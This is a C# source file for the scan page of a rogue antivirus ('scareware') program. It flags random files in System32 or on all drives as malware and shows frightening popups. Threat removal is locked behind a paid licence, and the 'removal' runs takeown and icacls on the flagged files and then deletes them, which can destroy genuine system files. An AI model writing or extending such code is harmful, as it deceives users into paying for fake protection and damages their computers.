using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using RogueAntivirusPatched.MVVM;
using RogueAntivirusPatched.Model;
using Results = RogueAntivirusPatched.Model.mThreatResults;
using System.Threading;
using System.IO;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using RogueAntivirusPatched.ViewModel;
using RogueAntivirusPatched.Advertisement;
using System.Windows.Markup;
using Microsoft.Win32;
using System.Windows.Threading;
using System.Runtime.InteropServices;
using BackTimer = System.Timers;
using RogueAntivirusPatched.Global;
using RogueAntivirusPatched.View.Windows;
using Windows.UI.Xaml.Input;
using System.Diagnostics;
using AdvancedIO;
using RogueAntivirusPatched.Windows;
using static RogueAntivirusPatched.Global.Convertor;
using System.Drawing;
using Windows.ApplicationModel.Chat;
using static CommandPrompt.CMD;
using RogueAntivirusPatched.View.CustomUserControl;
using System.Globalization;

namespace RogueAntivirusPatched.View.Pages
{
    /// <summary>
    /// Interaction logic for AntivirusPage.xaml
    /// </summary>
    public partial class AntivirusPage : Page
    {
        private vmAntivirusPage _vmAntivirusPage;

        private static ManualResetEvent thScanEvent = new ManualResetEvent(true);
        private static Thread thQuickScan, thDeepScan, thCustomScan;
        private KeySender keySender;
        private RandomAd ads;
        private NotifyAd defaultNotification;
        private Sounds sounds;
        private AboutSecurity aboutSecurity;
        private Popup popup;
        private Events events;
        private GetAppID getAppID;

        private advancedIO _advancedIO;

        private Random rand;

        private int scannedTotal;
        public static List<string> allFiles;

        private BackTimer.Timer timerProcessDelay;
        private static int threadDelay = 0;

        private bool isThQuickScan = false;
        private bool isThDeepScan = false;
        private bool isThCustomScan = false;

        public class RegistryValues
        {
            public const string ScannedFiles = "FilesScanned";
            public const string LastProcessedFile = "LastProcessedFile";
        }

        bool IsPaused = false;

        string detected, scanned, processing;

        public AntivirusPage(bool immediateScan = false)
        {
            InitializeComponent();
            _vmAntivirusPage = new vmAntivirusPage();
            DataContext = _vmAntivirusPage;

            detected = _vmAntivirusPage.TextThreatsDetected;
            scanned = _vmAntivirusPage.TextScannedFiles;
            processing = _vmAntivirusPage.TextProcessingFile;

            _vmAntivirusPage.IsEnabledStartBtn = true;
            _vmAntivirusPage.IsEnabledStopBtn = false;
            _vmAntivirusPage.IsEnabledPauseBtn = false;

            keySender = new KeySender();
            ads = new RandomAd();
            defaultNotification = new NotifyAd();
            _advancedIO = new advancedIO();
            sounds = new Sounds();
            aboutSecurity = new AboutSecurity();
            getAppID = new GetAppID();

            events = new Events();
            events.popUpPublisher.popUpHandler += PopUpPublisher_popUpHandler;

            if (!immediateScan)
                return;

            if (File.Exists(AboutSecurity.OutputThreatData.Type))
                return;

            if (Variables.IsPageWorking)
                return;

            var args = new MouseButtonEventArgs(Mouse.PrimaryDevice, Environment.TickCount, MouseButton.Left)
            {
                RoutedEvent = MouseLeftButtonDownEvent
            };

            BtnStartClick(this, args);
        }

        private void PopUpPublisher_popUpHandler(object sender, Events.PopUpArgs e)
        {
            if (Variables.IsPageWorking)
                return;

            if (Variables.PayloadsRunning || Variables.KeystrokeTriggerRunning)
                return;

            var args = new MouseButtonEventArgs(Mouse.PrimaryDevice, Environment.TickCount, MouseButton.Left)
            {
                RoutedEvent = MouseLeftButtonDownEvent
            };

            switch (e.popUpType)
            {
                case Events.PopUpArgs.PopUpType.AVLoaded:
                    BtnRemoveThreatsClick(this, args);
                    break;

                case Events.PopUpArgs.PopUpType.AVThreatsFound:
                    BtnRemoveThreatsClick(this, args);
                    break;
            }
        }

        private void Page_Loaded(object sender, RoutedEventArgs e)
        {
            ThreatData.Columns[0].Header = "";
            ThreatData.Columns[1].Header = "";
            ThreatData.Columns[2].Header = "";
            ThreatData.Columns[3].Header = "";
            ThreatData.Columns[4].Header = "";

            ThreatData.Columns[1].Width = 200;
            ThreatData.Columns[2].Width = 100;
            ThreatData.Columns[3].Width = 300;
            ThreatData.Columns[4].Width = 110;

            ThreatData.Columns[0].IsReadOnly = false;
            ThreatData.Columns[1].IsReadOnly = true;
            ThreatData.Columns[2].IsReadOnly = true;
            ThreatData.Columns[3].IsReadOnly = true;
            ThreatData.Columns[4].IsReadOnly = true;

            var checkBoxStyle = (Style)FindResource("CustomCheckBoxStyle");

            if (ThreatData.Columns[0] is DataGridCheckBoxColumn checkBoxColumn)
            {
                checkBoxColumn.ElementStyle = checkBoxStyle;
                checkBoxColumn.EditingElementStyle = checkBoxStyle;
            }

            ThreatData.Columns[0].Width = 35;

            var outputData = aboutSecurity.ClassToArray();

            LoadThreatData();
        }

        private void BtnStartClick(object sender, MouseButtonEventArgs e)
        {
            if (!_vmAntivirusPage.IsEnabledStartBtn)
                return;

            if (!_vmAntivirusPage.IsQuick && !_vmAntivirusPage.IsDeep && !_vmAntivirusPage.IsCustom)
                return;

            TTS.SpeakInterrupted(TTS.TTSProperty.Antivirus.scanInit);

            Variables.IsPageWorking = true;
            ScanBegin();

            if (_vmAntivirusPage.IsQuick == true)
            {
                isThQuickScan = true;

                if (thQuickScan != null && thQuickScan.IsAlive)
                    thQuickScan.Abort();

                thQuickScan = new Thread(QuickScan);
                thQuickScan.Start();
                return;
            }
            if (_vmAntivirusPage.IsDeep == true)
            {
                isThDeepScan = true;

                if (thDeepScan != null && thDeepScan.IsAlive)
                    thDeepScan.Abort();

                thDeepScan = new Thread(DeepScan);
                thDeepScan.Start();
                return;
            }
            if (_vmAntivirusPage.IsCustom == true)
            {
                isThCustomScan = true;

                if (thCustomScan != null && thCustomScan.IsAlive)
                    thCustomScan.Abort();

                CleanAllFiles();
                var customScan = new CustomScan();
                customScan.ShowDialog();
                thCustomScan = new Thread(CustomScan);
                thCustomScan.Start();
                return;
            }
        }

        private void BtnStopClick(object sender, MouseButtonEventArgs e)
        {
            if (!_vmAntivirusPage.IsEnabledStopBtn)
                return;

            if (thQuickScan == null && thDeepScan == null && thCustomScan == null)
                return;

            if (thQuickScan != null)
            {
                if (thQuickScan.IsAlive)
                    isThQuickScan = false;
            }

            if (thDeepScan != null)
            {
                if (thDeepScan.IsAlive)
                    isThDeepScan = false;
            }

            if (thCustomScan != null)
            {
                if (thCustomScan.IsAlive)
                    isThCustomScan= false;
            }

            _vmAntivirusPage.IsEnabledStartBtn = true;
            _vmAntivirusPage.IsEnabledStopBtn = false;
            _vmAntivirusPage.IsEnabledPauseBtn = false;
            _vmAntivirusPage.IsRemoveThreats = true;
            ScanningFinished();
        }

        private void BtnPauseClick(object sender, MouseButtonEventArgs e)
        {
            if (!_vmAntivirusPage.IsEnabledPauseBtn)
                return;

            if (thQuickScan == null && thDeepScan == null && thCustomScan == null)
                return;

            if (!IsPaused)
            {
                TTS.SpeakInterrupted(TTS.TTSProperty.Antivirus.paused);

                thScanEvent.Reset();

                _vmAntivirusPage.ContentPauseBtn = "Resume";

                _vmAntivirusPage.IsEnabledStopBtn = false;
                _vmAntivirusPage.IsEnabledStartBtn = false;
                IsPaused = true;
                return;
            }

            TTS.SpeakInterrupted(TTS.TTSProperty.Antivirus.resumed);

            _vmAntivirusPage.ContentPauseBtn = "Pause";

            thScanEvent.Set();
            _vmAntivirusPage.IsEnabledStopBtn = true;
            _vmAntivirusPage.IsEnabledStartBtn = false;
            IsPaused = false;
        }

        private void BtnRemoveThreatsClick(object sender, MouseButtonEventArgs e)
        {
            if (!keySender.HasLicense)
            {
                ads.OnlyForPro();
                return;
            }

            _vmAntivirusPage.ModesRadialEnabled = false;
            Variables.IsPageWorking = true;
            _vmAntivirusPage.IsRemoveThreats = false;
            _vmAntivirusPage.TextScannedFiles = vmAntivirusPage.defaultTextScannedFiles;

            if (_vmAntivirusPage.ThreatInfo.Count <= 0)
            {
                _vmAntivirusPage.ModesRadialEnabled = true;
                return;
            }

            //Get rid of all threats which are not ticked

            for (int i = 0; i < _vmAntivirusPage.ThreatInfo.Count; i++)
            {
                if (!_vmAntivirusPage.ThreatInfo[i].IsChecked)
                {
                    _vmAntivirusPage.ThreatInfo.RemoveAt(i);
                    i -= 1;
                }
            }

            //Delete the rest
            Task.Run(() => RemoveThreat());
        }

        private async Task RemoveThreat()
        {
            TTS.SpeakInterrupted(TTS.TTSProperty.Antivirus.removalInit);

            int index = 0;
            int removed = 0;
            var threatList = new List<string>();
            double onePercent = (1.0 / _vmAntivirusPage.ThreatInfo.Count) * 100;

            foreach (var item in _vmAntivirusPage.ThreatInfo)
            {
                threatList.Add(item.Location);
            }

            await Task.Run(() =>
            {
                while (threatList.Count > 0)
                {
                    if (Variables.PayloadsRunning || Variables.KeystrokeTriggerRunning)
                        return;

                    string currentFile = threatList[index];

                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        _vmAntivirusPage.TextProcessingFile = currentFile;
                    });

                    if (File.Exists(currentFile))
                    {
                        try
                        {
                            var fileId = getAppID.ObtainAppID(currentFile);

                            if (!fileId.Equals(GetAppID.ThisAppID))
                            {
                                Command("takeown /f " + currentFile);
                                Command("icacls " + currentFile + @" /grant ""%username%:F"" /c /q");
                                File.Delete(currentFile);
                            }
                        }
                        catch { }
                    }

                    removed += 1;

                    threatList.RemoveAt(index);

                    //Update DataGrid
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        int oldLenght = _vmAntivirusPage.ThreatInfo.Count;

                        int difference = oldLenght - threatList.Count;

                        for (int i = 0; i < difference; i++)
                        {
                            _vmAntivirusPage.ThreatInfo.RemoveAt(i);
                            _vmAntivirusPage.BarValue += onePercent;
                            _vmAntivirusPage.TextThreatsRemoved = vmAntivirusPage.defaultTextThreatsRemoved + removed;
                            _vmAntivirusPage.ProcessStatus = "Removing Threats: " + Math.Round(_vmAntivirusPage.BarValue).ToString() + "%";
                        }
                    });
                }

                CleanThreatData();

                string result = TTS.TTSProperty.Antivirus.threatsRemoved;
                TTS.SpeakInterrupted(result);

                string title = "Alert";
                string subTitle = "Threats removed";
                string text = "We have good news. All selected threats have been successfully removed!" + Environment.NewLine +
                "Since your computer is malware-free, you can use it without any potential risks." + Environment.NewLine +
                "Next time, be more careful on the internet. If you stumble upon a weird website, " +
                "don't try to download any products that they provide and leave the website immediately!" + Environment.NewLine +
                "Always download products from verified websites!";
                var bitmap = Properties.Resources.satisfied_shield;
                var margin = new Thickness(0, 0, 0, 80);
                var width = 600;
                var height = 500;
                var sound = Properties.Resources.success;
                events.ShowPopUp(Events.PopUpArgs.PopUpType.AVThreatsRemoved, title, subTitle, text, bitmap, margin, width, height, sound);

                Application.Current.Dispatcher.Invoke(() =>
                {
                    _vmAntivirusPage.TextProcessingFile = vmAntivirusPage.defaultTextProcessingFile;
                    _vmAntivirusPage.TextThreatsDetected = vmAntivirusPage.defaultTextThreatsDetected + " 0";
                    _vmAntivirusPage.BarValue = 0;
                    _vmAntivirusPage.ProcessStatus = result;
                    _vmAntivirusPage.IsEnabledStartBtn = true;
                    aboutSecurity.DetermineStatus();
                });
            });
            Variables.IsPageWorking = false;
            _vmAntivirusPage.ModesRadialEnabled = true;
        }

        private int GetSelectedThreats()
        {
            int lenght = _vmAntivirusPage.ThreatInfo.Count;

            foreach (var item in _vmAntivirusPage.ThreatInfo)
            {
                if (!item.IsChecked)
                    lenght -= 1;
            }

            return lenght;
        }

        public void QuickScan()
        {
            string targetDir = @"C:\Windows\Sysnative";

            if (!Directory.Exists(targetDir))
                targetDir = @"C:\Windows\System32";

            string[] getFiles = Directory.GetFiles(targetDir);

            CleanAllFiles();
            allFiles = getFiles.ToList();
            ScanningProcess();
        }

        public void DeepScan()
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                _vmAntivirusPage.ProcessStatus = "Collecting files ... This operation might take several minutes.";
                _vmAntivirusPage.IsEnabledPauseBtn = false;
            });

            string[] drives = _advancedIO.GetDrives();
            var listCollector = new List<List<string>>();
            var collectedFiles = new List<string>();

            foreach (string drive in drives)
            {
                listCollector.Add(_advancedIO.GetAllFilesSafely(true, drive, "*"));
            }

            foreach (List<string> list in listCollector)
            {
                foreach (string file in list)
                {
                    collectedFiles.Add(file);
                }
            }

            listCollector.Clear();

            CleanAllFiles();
            allFiles = collectedFiles;
            _vmAntivirusPage.IsEnabledPauseBtn = true;
            ScanningProcess();
        }

        private void CustomScan()
        {
            ScanningProcess();
        }

        private void ScanningProcess()
        {
            _vmAntivirusPage.ModesRadialEnabled = false;

            double onePercent = (1.0 / allFiles.Count) * 100;

            Random rand = new Random();

            int threadDetected = 0;

            string textThreatsDetected = detected + threadDetected;
            string textProcessingFile, textScannedFiles, processStatus;
            double barValue = 0;

            Application.Current.Dispatcher.Invoke(new Action(() =>
            {
                _vmAntivirusPage.TextThreatsDetected = textThreatsDetected;
            }));

            SetupDelayTimer();

            for (int i = 0; i < allFiles.Count; i++)
            {
                if (Variables.PayloadsRunning || Variables.KeystrokeTriggerRunning)
                    return;

                thScanEvent.WaitOne();
                textProcessingFile = processing + allFiles[i];
                textScannedFiles = scanned + i;
                barValue += onePercent;

                string percents = Math.Round(_vmAntivirusPage.BarValue).ToString();

                processStatus = "Searching for Threats ... " + percents + "%";

                scannedTotal += 1;
                if (rand.Next(100) == 1)
                {
                    threadDetected++;
                    textThreatsDetected = detected + threadDetected;
                    string fixedLocation = textProcessingFile.Replace(processing, "");
                    ThreatDetected(fixedLocation);
                }

                Application.Current.Dispatcher.Invoke(() =>
                {
                    _vmAntivirusPage.TextThreatsDetected = textThreatsDetected;
                    _vmAntivirusPage.TextProcessingFile = textProcessingFile;
                    _vmAntivirusPage.TextScannedFiles = textScannedFiles;
                    _vmAntivirusPage.ProcessStatus = processStatus;
                    _vmAntivirusPage.BarValue = barValue;
                });

                if (!isThQuickScan && !isThDeepScan && !isThCustomScan)
                {
                    break;
                }

                Thread.Sleep(threadDelay);
            }

            Application.Current.Dispatcher.Invoke(new Action(() =>
            {
                ScanningFinished();
            }));
            _vmAntivirusPage.ModesRadialEnabled = true;
        }

        private void CleanAllFiles()
        {
            if (allFiles == null)
                return;
            if (allFiles.Count == 0)
                return;

            allFiles.Clear();
        }

        private void ScanBegin()
        {
            _vmAntivirusPage.TextThreatsRemoved = vmAntivirusPage.defaultTextThreatsRemoved;
            _vmAntivirusPage.IsEnabledStopBtn = true;
            _vmAntivirusPage.IsEnabledStartBtn = false;
            _vmAntivirusPage.IsEnabledPauseBtn = true;
            _vmAntivirusPage.IsRemoveThreats = false;
        }

        private void ScanningFinished()
        {
            if (ThreadRestriction.IsThreadAllowed())
            {
                if (_vmAntivirusPage.ThreatInfo.Count > 0)
                {
                    string title = "Alert";
                    string subTitle = "Threats found";
                    string text = "Your device is in danger! We have found " + _vmAntivirusPage.ThreatInfo.Count + " malicious program(s)!"
                        + Environment.NewLine + "We are highly recommending removing all found threats until they cause further damage! " +
                        "Not only is your computer in danger, but also your precious personal information!";
                    var bitmap = Properties.Resources.furious_shield;
                    var margin = new Thickness(0, 0, 0, 80);
                    var width = 500;
                    var height = 450;
                    var sound = Properties.Resources.alert;
                    var btn1Content = "Remove";
                    var btn2Content = "Later";

                    events.ShowPopUp(Events.PopUpArgs.PopUpType.AVThreatsFound, title, subTitle, text, bitmap, margin, width, height, sound, btn1Content, btn2Content);

                    TTS.SpeakInterrupted(TTS.TTSProperty.Antivirus.threatsFound);
                }
                else
                {
                    string title = "Alert";
                    string subTitle = "No threats found";
                    string text = "It seems that your computer is safe. We didn't find any harmful programs!";
                    var bitmap = Properties.Resources.satisfied_shield;
                    var margin = new Thickness(0, 0, 0, 80);
                    var sound = Properties.Resources.success;
                    events.ShowPopUp(Events.PopUpArgs.PopUpType.AVThreatsNotFound, title, subTitle, text, bitmap, margin, 500, 400, sound);

                    TTS.SpeakInterrupted(TTS.TTSProperty.Antivirus.noThreatsFound);
                }
            }

            Task.Run(async() => 
            {
                await Task.Delay(100);
                ThreadRestriction.threadCount = 0; 
            });

            Variables.IsPageWorking = false;
            _vmAntivirusPage.ProcessStatus = StatusResults();
            _vmAntivirusPage.BarValue = 0;
            if (_vmAntivirusPage.ThreatInfo.Count > 0)
            {
                _vmAntivirusPage.IsEnabledStartBtn = false;
                _vmAntivirusPage.IsEnabledPauseBtn = false;
                _vmAntivirusPage.IsEnabledStopBtn = false;
                _vmAntivirusPage.IsRemoveThreats = true;
            }
            else
            {
                _vmAntivirusPage.IsEnabledStartBtn = true;
                _vmAntivirusPage.IsEnabledPauseBtn = false;
                _vmAntivirusPage.IsEnabledStopBtn = false;
                _vmAntivirusPage.IsRemoveThreats = false;
                _vmAntivirusPage.BarValue = 0;
                _vmAntivirusPage.TextProcessingFile = vmAntivirusPage.defaultTextProcessingFile;
                scannedTotal = 0;
            }

            bools.Clear();
            vectors.Clear();
            types.Clear();
            locations.Clear();
            levels.Clear();

            if (allFiles == null || timerProcessDelay == null)
                return;

            if (scannedTotal <= 0)
                return;

            StoreToRegistry(RegistryValues.ScannedFiles, scannedTotal, RegistryValueKind.DWord);
            StoreToRegistry(RegistryValues.LastProcessedFile, allFiles[scannedTotal - 1], RegistryValueKind.String);

            scannedTotal = 0;

            timerProcessDelay.Stop();
        }

        private void SetupDelayTimer()
        {
            rand = new Random();

            timerProcessDelay = new BackTimer.Timer();
            timerProcessDelay.Interval = 3000;
            timerProcessDelay.Enabled = false;
            timerProcessDelay.Elapsed += TimerProcessDelay_Elapsed;
            timerProcessDelay.Start();

            threadDelay = rand.Next(10, 200);
        }

        private void TimerProcessDelay_Elapsed(object sender, EventArgs e)
        {
            rand = new Random();

            threadDelay = rand.Next(10, 200);
        }

        private void BtnDeepScan_Click(object sender, MouseButtonEventArgs e)
        {
            Task.Run(async() => 
            {
                await Task.Delay(100);
                Application.Current.Dispatcher.Invoke(() =>
                {
                    if (!keySender.HasLicense)
                    {
                        ads.OnlyForPro();
                        _vmAntivirusPage.IsDeep = false;
                        _vmAntivirusPage.IsQuick = true;
                        return;
                    }
                });
            });
        }

        private void BtnCustomScan_Click(object sender, MouseButtonEventArgs e)
        {
            Task.Run(async () =>
            {
                await Task.Delay(100);
                Application.Current.Dispatcher.Invoke(() =>
                {
                    if (!keySender.HasLicense)
                    {
                        ads.OnlyForPro();
                        _vmAntivirusPage.IsCustom = false;
                        _vmAntivirusPage.IsQuick = true;
                        return;
                    }
                });
            });
        }

        List<bool> bools = new List<bool>();
        List<string> vectors = new List<string>();
        List<string> types = new List<string>();
        List<string> locations = new List<string>();
        List<string> levels = new List<string>();

        private void ThreatDetected(string location)
        {
            Random rand = new Random();

            string vector = Results.ThreatVector[rand.Next(Results.ThreatVector.Length)];
            string type = Results.MalwareTypes[rand.Next(Results.MalwareTypes.Length)];
            string level = Results.ThreatLevel[rand.Next(Results.ThreatLevel.Length)];

            bools.Add(true);
            vectors.Add(vector);
            types.Add(type);
            locations.Add(location);
            levels.Add(level);

            TTS.SpeakInterrupted(TTS.TTSProperty.Antivirus.threatDetectedPart1 + type + TTS.TTSProperty.Antivirus.threatDetectedPart2);

            Application.Current.Dispatcher.Invoke(() =>
            {
                _vmAntivirusPage.ThreatInfo.Clear();
                for (int i = 0; i < bools.Count; i++)
                {
                    _vmAntivirusPage.ThreatInfo.Add(new mThreatInfo
                    {
                        IsChecked = bools[i],
                        Vector = vectors[i],
                        Type = types[i],
                        Location = locations[i],
                        Level = levels[i]
                    });
                }
                string title = "Threat Detected";
                string subTitle = type + " Found";
                string text = "Location: " + location + Environment.NewLine +
                "Level: " + level;
                Bitmap imageLocation = null;

                if (type.StartsWith(Results.MalwareTypes[0]))
                    imageLocation = Properties.Resources.malware;
                if (type.StartsWith(Results.MalwareTypes[1]))
                    imageLocation = Properties.Resources.virus;
                if (type.StartsWith(Results.MalwareTypes[2]))
                    imageLocation = Properties.Resources.trojan;
                if (type.StartsWith(Results.MalwareTypes[3]))
                    imageLocation = Properties.Resources.worm;
                if (type.StartsWith(Results.MalwareTypes[4]))
                    imageLocation = Properties.Resources.spyware;
                if (type.StartsWith(Results.MalwareTypes[5]))
                    imageLocation = Properties.Resources.adware;

                popup = new Popup();

                popup.firstButton.PreviewMouseLeftButtonDown += (s, e) =>
                {
                    UISettings.ShowWindow();
                };

                popup.ShowPopup(title, subTitle, text, "Remove Threats", imageLocation);
                sounds.PlaySound(Properties.Resources.alert);
            });


            StoreThreatData(vector, type, location, level);
            SendNotification(vector, type, location, level);

            Application.Current.Dispatcher.Invoke(() =>
            {
                if (ThreatData.Items.Count - (ThreatData.CanUserAddRows ? 1 : 0) == 1)
                    aboutSecurity.DetermineStatus();
            });
        }

        private void StoreToRegistry(string valueName, object data, RegistryValueKind kind)
        {
            using (RegistryKey baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                using (RegistryKey regKey = baseKey.CreateSubKey(KeySender.mainPath))
                {
                    regKey.SetValue(valueName, data, kind);
                }
            }
        }

        private object LoadFromRegistry(string valueName)
        {
            using (RegistryKey baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                using (RegistryKey regKey = baseKey.OpenSubKey(KeySender.mainPath))
                {
                    if (regKey == null)
                        return 0;

                    return regKey.GetValue(valueName);
                }
            }
        }

        private void StoreThreatData(string vector, string type, string location, string level)
        {
            var outputData = aboutSecurity.ClassToArray();

            foreach (string dataFilePath in outputData)
            {
                string dataToWrite = "";

                if (AboutSecurity.OutputThreatData.Vector == dataFilePath) { dataToWrite = vector; }
                if (AboutSecurity.OutputThreatData.Type == dataFilePath) { dataToWrite = type; }
                if (AboutSecurity.OutputThreatData.Location == dataFilePath) { dataToWrite = location; }
                if (AboutSecurity.OutputThreatData.Level == dataFilePath) { dataToWrite = level; }

                using (StreamWriter sw = new StreamWriter(dataFilePath, true))
                {
                    sw.WriteLine(dataToWrite);
                }

                if (File.Exists(dataFilePath))
                    File.SetAttributes(dataFilePath, FileAttributes.Hidden);
            }
        }

        private void CleanThreatData()
        {
            var outputData = aboutSecurity.ClassToArray();

            foreach (string dataFilePath in outputData)
            {
                if (File.Exists(dataFilePath))
                    File.Delete(dataFilePath);
            }
        }

        private async void LoadThreatData()
        {
            var outputData = aboutSecurity.ClassToArray();

            foreach (string dataFilePath in outputData)
            {
                if (!File.Exists(dataFilePath))
                    return;
            }

            TTS.SpeakInterrupted(TTS.TTSProperty.Antivirus.threatsFound);

            _vmAntivirusPage.IsEnabledStartBtn = false;
            _vmAntivirusPage.IsRemoveThreats = true;

            string[] vectors = new string[0], types = new string[0], locations = new string[0], 
                levels = new string[0];

            _vmAntivirusPage.ProcessStatus = Variables.gatheringData;

            await Task.Run(async() =>
            {
                vectors = File.ReadAllLines(AboutSecurity.OutputThreatData.Vector);
                types = File.ReadAllLines(AboutSecurity.OutputThreatData.Type);
                locations = File.ReadAllLines(AboutSecurity.OutputThreatData.Location);
                levels = File.ReadAllLines(AboutSecurity.OutputThreatData.Level);

                for (int i = 0; i < vectors.Length; i++)
                {
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        _vmAntivirusPage.ThreatInfo.Add(new mThreatInfo
                        {
                            IsChecked = true,
                            Vector = vectors[i],
                            Type = types[i],
                            Location = locations[i],
                            Level = levels[i]
                        });
                    });
                    await Task.Delay(1);
                }
            });

            _vmAntivirusPage.TextThreatsDetected += vectors.Length.ToString();
            _vmAntivirusPage.TextScannedFiles += LoadFromRegistry(RegistryValues.ScannedFiles);
            _vmAntivirusPage.TextProcessingFile += LoadFromRegistry(RegistryValues.LastProcessedFile);
            _vmAntivirusPage.ProcessStatus = StatusResults();

            string title = "Alert";
            string subTitle = "Computer is infected";
            string text = "In total, this device is infected with " + _vmAntivirusPage.ThreatInfo.Count +
                " malicious program(s). You should remove all threats before they cause further damage to your computer!";
            var bitmap = Properties.Resources.infected;
            var margin = new Thickness(0, 0, 0, 80);
            var sound = Properties.Resources.alert;
            var btn1Content = "Remove";
            var btn2Content = "Later";
            events.ShowPopUp(Events.PopUpArgs.PopUpType.AVLoaded, title, subTitle, text, bitmap, margin, 500, 400, sound, btn1Content, btn2Content);
        }

        private string StatusResults()
        {
            if (!File.Exists(AboutSecurity.OutputThreatData.Vector))
            {
                return TTS.TTSProperty.Antivirus.noThreatsFound;
            }

            return TTS.TTSProperty.Antivirus.threatsFound;
        }

        private void SendNotification(string vector, string type, string location, string level)
        {
            defaultNotification.SetNotification("Level of danger: " + level + Environment.NewLine + 
                "Threat code name: " + vector + Environment.NewLine + 
                "This threat was found in " + Environment.NewLine + "\"" + location + "\""
                , type + " was Found!", NotifyAd.Arguments.Exception);
        }
    }
}
